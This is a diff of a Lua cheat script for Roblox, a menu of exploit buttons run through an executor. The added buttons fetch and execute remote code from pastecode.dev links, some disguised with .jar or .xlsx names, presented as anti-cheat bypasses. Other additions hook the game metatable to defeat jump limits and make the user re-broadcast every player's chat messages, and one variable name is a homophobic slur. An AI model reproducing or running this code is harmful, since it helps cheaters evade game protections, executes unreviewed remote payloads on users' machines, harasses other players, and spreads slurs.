@@ -2,7 +2,7 @@
 -- Version: 9
 
 -- [ last update,version,exploit ] --
-local LastUpdate="Last Update: Apr 27, 2024";
+local LastUpdate="Last Update: Apr 28, 2024";
 local Vv="9";
 local exploit=identifyexecutor();
 
@@ -253,6 +253,18 @@ end)
 SkriptsSection:NewButton("ANTI-BAN (fixed &working✅)", "anti-ban skript/antilogger", function()
 --just anti logger (safexhat)
 loadstring(game:HttpGet("https://pastecode.dev/raw/tarixx9o/lulas-antiban.jar",true))()
+end)
+
+SkriptsSection:NewButton("No jump Kooldown", "nojumpkooldown", function()
+local IsA = game.IsA
+                    local newindex = nil
+        
+                    newindex = hookmetamethod(game, "__newindex", function(self, Index, Value)
+                        if not checkcaller() and IsA(self, "Humanoid") and Index == "JumpPower" then
+                            return
+                        end
+                        return newindex(self, Index, Value)
+                    end)
 end)
 
 SkriptsSection:NewButton("Anti-Xheat bypass\nUse: bypass any klient fly/fling detektion", "allows u to hide stuff on your klient", function()
@@ -1454,6 +1466,12 @@ SayMessageRequest:FireServer(('\%s'):format(message,""),tostring(data.OriginalCh
 end
 end)
 end)
+
+FunSection:NewButton("Kopy chat V2", "sum", function() local FUXKINGFAGGOTS=game.Players:GetPlayers()
+for i=1,#FUXKINGFAGGOTS do
+FUXKINGFAGGOTS[i].Chatted:connect(function(Message)game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("".."["..FUXKINGFAGGOTS[i].Name.."]".." "..Message, "All")
+  end)
+end;end) 
 
 FunSection:NewButton("Nerd Quote", " repeats all msgs with a nerd quote", function()local ReplicatedStorage = game:FindService("ReplicatedStorage")
 local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
@@ -4256,7 +4274,7 @@ end)
 
 
 -- More.TabMy.Skrpts
-local More = Window:NewTab("More")
+local More = Window:NewTab("Bypasses & More")
 local MoreSection = More:NewSection("more skripts koming soon...🍭")
 
 MoreSection:NewButton("Bypasses & Anti-cheats", "an anti", function()-- anti bit detektion
@@ -4291,6 +4309,19 @@ for _, key in next, getgc(true) do
     end;
 wait()
 loadstring(game:HttpGet("https://pastecode.dev/raw/nZaPtHFa5p/lollypop5ever_lulaslollipop",true))()
+end)
+
+MoreSection:NewButton("Adonis", "bypass", function() loadstring(game:HttpGet("https://pastecode.dev/raw/yld9n9zg/adonis",true))();end)
+
+MoreSection:NewButton("🏏Bladeball anti-cheat bypass", "sum", function() loadstring(game:HttpGet("https://pastecode.dev/raw/pf45h4w7/bladeball-antixheatbypass_lulaslollipop.xlsx",true))();end)
+
+MoreSection:NewButton("Anti-cheat Bypass 2 (kick)", "sum", function()
+--anti xheat byp 2
+loadstring(game:HttpGet("https://pastecode.dev/raw/d5rj6wmt/Antirrixh",true))()
+end)
+
+MoreSection:NewButton("Protekt frm malixious skripts", "sum", function()
+loadstring(game:HttpGet("https://pastecode.dev/raw/36qa39lf/UNVRSLBYPASSER_lulaslollipop.xlsx",true))()
 end)
 
 MoreSection:NewButton("Universal 🔑 Bypasser", "key bypsr", function()
